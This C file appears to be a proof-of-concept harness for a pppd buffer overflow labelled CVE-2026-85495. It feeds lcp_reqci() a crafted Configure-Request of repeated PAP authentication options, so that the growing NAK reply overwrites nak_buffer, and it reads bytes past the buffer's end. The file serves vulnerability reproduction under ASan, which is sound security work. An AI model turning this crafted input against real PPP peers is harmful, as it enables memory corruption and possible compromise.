/* pppd CVE-2026-85495 harness. lcp_reqci() and its CILEN defines below are
 * extracted verbatim from the pinned pppd/lcp.c; real pinned headers supply
 * the types and macros. Only the globals, debug stubs and driver are local.
 * Build at -O0. Run under ASan to observe the nak_buffer[PPP_MRU] overwrite. */
#include <linux/types.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

#include "pppdconf.h"
#include "pppd.h"
#include "pppd-private.h"
#include "fsm.h"
#include "lcp.h"
#include "chap.h"

#define CODENAME(x) ((x) == CONFACK ? "ACK" : (x) == CONFNAK ? "NAK" : "REJ")
#include "eap.h"
#ifndef CI_COUNT
#define CI_COUNT 320
#endif
#ifndef CHOSEN_MDTYPE
#define CHOSEN_MDTYPE MDTYPE_MICROSOFT
#endif

/* Exact pinned globals from lcp.c:209-221. */
static u_char nak_buffer[PPP_MRU];
fsm lcp_fsm[NUM_PPP];
lcp_options lcp_wantoptions[NUM_PPP];
lcp_options lcp_gotoptions[NUM_PPP];
lcp_options lcp_allowoptions[NUM_PPP];
lcp_options lcp_hisoptions[NUM_PPP];
int chap_mdtype_all = MDTYPE_MD5;
int debug = 0;

void dbglog(const char *fmt, ...) { (void) fmt; }
u_int32_t magic(void) { return 0x5a5a5a5au; }
bool multilink = false;
void warn(const char *fmt, ...) { (void) fmt; }

#include "lcp_functions.inc"

#ifndef FRONTIER_ASAN
#if defined(__SANITIZE_ADDRESS__)
#define FRONTIER_ASAN 1
#elif defined(__has_feature)
#if __has_feature(address_sanitizer)
#define FRONTIER_ASAN 1
#endif
#endif
#endif

int main(void)
{
    unsigned char req[4096];
    int n = 0;
    const int count = CI_COUNT;     /* each 4-byte PAP CI becomes a 5-byte NAK */
    const int mdtype_chosen = CHOSEN_MDTYPE;

    for (int i = 0; i < count; ++i) {
        req[n++] = CI_AUTHTYPE;
        req[n++] = CILEN_SHORT;     /* 4-byte PAP CI */
        req[n++] = (unsigned char)(PPP_PAP >> 8);
        req[n++] = (unsigned char)(PPP_PAP & 0xff);
    }

    memset(&lcp_fsm[0], 0, sizeof(lcp_fsm[0]));
    memset(&lcp_allowoptions[0], 0, sizeof(lcp_options));
    lcp_allowoptions[0].neg_upap = 0;    /* PAP not allowed -> NAK it */
    lcp_allowoptions[0].neg_eap = 0;     /* suggest CHAP, not EAP */
    lcp_allowoptions[0].neg_chap = 1;
    lcp_allowoptions[0].chap_mdtype = mdtype_chosen;

    int len = n;
    int rc = lcp_reqci(&lcp_fsm[0], req, &len, 0);
    printf("rc=%d in=%d out=%d count=%d\n", rc, n, len, count);
    printf("nak_buffer_size=%d\n", (int) sizeof nak_buffer);
#ifndef FRONTIER_ASAN
    printf("readback+1500=");
    for (int i = 0; i < 10; ++i) printf("%02x", nak_buffer[sizeof nak_buffer + i]);
    printf("\n");
#endif
    return 0;
}
